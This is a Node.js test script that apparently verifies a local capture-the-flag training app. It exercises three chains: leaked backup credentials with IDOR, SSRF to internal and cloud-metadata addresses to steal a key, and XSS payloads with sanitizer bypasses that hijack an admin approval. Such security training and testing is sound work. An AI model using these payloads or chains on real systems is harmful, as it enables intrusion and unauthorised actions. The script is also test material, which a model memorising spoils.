const http = require("http");
function req(method, path, { cookies = "", body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : null;
    const opts = { host: "localhost", port: 3000, path, method, headers: Object.assign({}, headers, cookies ? { Cookie: cookies } : {}, data ? { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } : {}) };
    const r = http.request(opts, (res) => { let c = []; res.on("data", (d) => c.push(d)); res.on("end", () => resolve({ status: res.statusCode, body: Buffer.concat(c).toString(), setCookie: res.headers["set-cookie"] || [], json: () => { try { return JSON.parse(Buffer.concat(c).toString()); } catch (e) { return null; } } })); });
    r.setTimeout(4000, () => r.destroy(new Error("timeout: " + method + " " + path)));
    r.on("error", reject);
    if (data) r.write(data);
    r.end();
  });
}
function cookieStr(setCookieArr, existing) {
  const jar = {};
  (existing || "").split(";").forEach((p) => { const [k, v] = p.trim().split("="); if (k) jar[k] = v; });
  (setCookieArr || []).forEach((sc) => { const [kv] = sc.split(";"); const [k, v] = kv.split("="); jar[k] = v; });
  return Object.entries(jar).filter(([k]) => k).map(([k, v]) => `${k}=${v}`).join("; ");
}
async function freshCookies(path) { const r = await req("GET", path); return cookieStr(r.setCookie, ""); }
let pass = 0, fail = 0;
function check(name, cond, extra) { if (cond) { pass++; console.log("PASS:", name); } else { fail++; console.log("FAIL:", name, extra || ""); } }
function hasFlag(obj) { return JSON.stringify(obj).includes("FLAG{"); }
setTimeout(() => { console.log(`DEADLINE HIT: ${pass} passed, ${fail} failed (incomplete)`); process.exit(2); }, 40000).unref();

async function run() {
  // ============================= chain-support-takeover =============================
  for (const [difficulty, backupPath, encode] of [
    ["easy", "/vuln/chain-support-takeover/backup/config.js.bak", (id) => String(id)],
    ["medium", "/vuln/chain-support-takeover/backup/support-portal.js.bak", (id) => String(id + 4817)],
    ["hard", "/vuln/chain-support-takeover/.git-config", (id) => Buffer.from(String(id)).toString("base64")]
  ]) {
    const c = await freshCookies(`/vuln/chain-support-takeover?difficulty=${difficulty}`);
    const backupResp = await req("GET", `${backupPath}?difficulty=${difficulty}`, { cookies: c });
    check(`chain-support-takeover ${difficulty}: backup file leaks creds`, /Supp0rt_Temp_2026!/.test(backupResp.body), backupResp.body.slice(0, 100));

    const loginResp = await req("POST", `/vuln/chain-support-takeover/login?difficulty=${difficulty}`, { cookies: c, body: { username: "support_temp", password: "Supp0rt_Temp_2026!" } });
    check(`chain-support-takeover ${difficulty}: login succeeds`, loginResp.json().success === true);

    const wrongPass = await freshCookies(`/vuln/chain-support-takeover?difficulty=${difficulty}`);
    const loginFail = await req("POST", `/vuln/chain-support-takeover/login?difficulty=${difficulty}`, { cookies: wrongPass, body: { username: "support_temp", password: "wrong" } });
    check(`chain-support-takeover ${difficulty}: wrong password rejected`, loginFail.json().success === false);

    const ownTicket = await req("GET", `/vuln/chain-support-takeover/tickets/${encode(1)}?difficulty=${difficulty}`, { cookies: c });
    check(`chain-support-takeover ${difficulty}: own ticket readable, no flag`, ownTicket.status === 200 && !hasFlag(ownTicket.json()), JSON.stringify(ownTicket.json()));

    const idorTicket = await req("GET", `/vuln/chain-support-takeover/tickets/${encode(2)}?difficulty=${difficulty}`, { cookies: c });
    check(`chain-support-takeover ${difficulty}: IDOR on finance ticket -> flag`, hasFlag(idorTicket.json()), JSON.stringify(idorTicket.json()));

    const noAuthTry = await req("GET", `/vuln/chain-support-takeover/tickets/${encode(2)}?difficulty=${difficulty}`);
    check(`chain-support-takeover ${difficulty}: ticket access requires login first`, noAuthTry.status === 403);
  }

  // ============================= chain-internal-pivot =============================
  const ch2Cases = [
    ["easy", "http://internal-admin.local/creds", "http://evil.test/whatever"],
    ["medium", "http://169.254.169.254/latest/meta-data/", "http://internal-admin.local/creds"],
    ["hard", "https://safe-redirector.securecorp-demo.test/go?to=internal-admin.local", "http://169.254.169.254/latest/meta-data/"]
  ];
  for (const [difficulty, workingUrl, blockedAtThisTier] of ch2Cases) {
    const c = await freshCookies(`/vuln/chain-internal-pivot?difficulty=${difficulty}`);
    const blocked = await req("POST", `/vuln/chain-internal-pivot/preview?difficulty=${difficulty}`, { cookies: c, body: { url: blockedAtThisTier } });
    check(`chain-internal-pivot ${difficulty}: prior-tier vector now blocked`, !blocked.json().internalKey, JSON.stringify(blocked.json()));

    const ssrf = await req("POST", `/vuln/chain-internal-pivot/preview?difficulty=${difficulty}`, { cookies: c, body: { url: workingUrl } });
    check(`chain-internal-pivot ${difficulty}: SSRF reaches internal service, leaks key`, !!ssrf.json().internalKey, JSON.stringify(ssrf.json()));

    const noKey = await req("GET", `/vuln/chain-internal-pivot/admin-api/flag?difficulty=${difficulty}`, { cookies: c });
    check(`chain-internal-pivot ${difficulty}: admin API rejects missing key`, noKey.status === 403);
    const wrongKey = await req("GET", `/vuln/chain-internal-pivot/admin-api/flag?difficulty=${difficulty}`, { cookies: c, headers: { "X-Internal-Key": "totally-made-up" } });
    check(`chain-internal-pivot ${difficulty}: admin API rejects wrong key`, wrongKey.status === 403);

    const realKey = ssrf.json().internalKey;
    const withKey = await req("GET", `/vuln/chain-internal-pivot/admin-api/flag?difficulty=${difficulty}`, { cookies: c, headers: { "X-Internal-Key": realKey } });
    check(`chain-internal-pivot ${difficulty}: leaked key against admin API -> flag`, hasFlag(withKey.json()), JSON.stringify(withKey.json()));
  }

  // ============================= chain-xss-to-admin-action =============================
  const ch3Cases = [
    ["easy", `<img src=x onerror="fetch('/vuln/chain-xss-to-admin-action/admin-approve?difficulty=easy',{method:'POST'})">`, "plain text, no live tag at all"],
    ["medium", `<img src=x onerror="fetch('/vuln/chain-xss-to-admin-action/admin-approve?difficulty=medium',{method:'POST'})">`, `<script>fetch('/vuln/chain-xss-to-admin-action/admin-approve?difficulty=medium',{method:'POST'})</script>`],
    ["hard", `<svg onbegin="fetch('/vuln/chain-xss-to-admin-action/admin-approve?difficulty=hard',{method:'POST'})">`, `<img src=x onerror="fetch('/vuln/chain-xss-to-admin-action/admin-approve?difficulty=hard',{method:'POST'})">`]
  ];
  for (const [difficulty, workingPayload, blockedPayload] of ch3Cases) {
    const cBlocked = await freshCookies(`/vuln/chain-xss-to-admin-action?difficulty=${difficulty}`);
    await req("POST", `/vuln/chain-xss-to-admin-action/submit?difficulty=${difficulty}`, { cookies: cBlocked, body: { message: blockedPayload } });
    const reviewBlocked = await req("POST", `/vuln/chain-xss-to-admin-action/simulate-admin-review?difficulty=${difficulty}`, { cookies: cBlocked });
    check(`chain-xss-to-admin-action ${difficulty}: sanitized-at-this-tier payload doesn't run`, /nothing executed/i.test(reviewBlocked.json().note), JSON.stringify(reviewBlocked.json()));
    const approveBlocked = await req("POST", `/vuln/chain-xss-to-admin-action/admin-approve?difficulty=${difficulty}`, { cookies: cBlocked });
    check(`chain-xss-to-admin-action ${difficulty}: approve rejected with no hijacked session`, approveBlocked.status === 403);

    const c = await freshCookies(`/vuln/chain-xss-to-admin-action?difficulty=${difficulty}`);
    await req("POST", `/vuln/chain-xss-to-admin-action/submit?difficulty=${difficulty}`, { cookies: c, body: { message: workingPayload } });
    const review = await req("POST", `/vuln/chain-xss-to-admin-action/simulate-admin-review?difficulty=${difficulty}`, { cookies: c });
    check(`chain-xss-to-admin-action ${difficulty}: working payload survives sanitization`, /ran your script/i.test(review.json().note), JSON.stringify(review.json()));
    const approve = await req("POST", `/vuln/chain-xss-to-admin-action/admin-approve?difficulty=${difficulty}`, { cookies: c });
    check(`chain-xss-to-admin-action ${difficulty}: transfer approved via hijacked admin session -> flag`, hasFlag(approve.json()) && approve.json().transferApproved === true, JSON.stringify(approve.json()));
  }

  console.log(`\n=== ${pass} passed, ${fail} failed ===`);
  process.exit(fail > 0 ? 1 : 0);
}
run().catch((e) => { console.error("ERROR:", e); process.exit(1); });
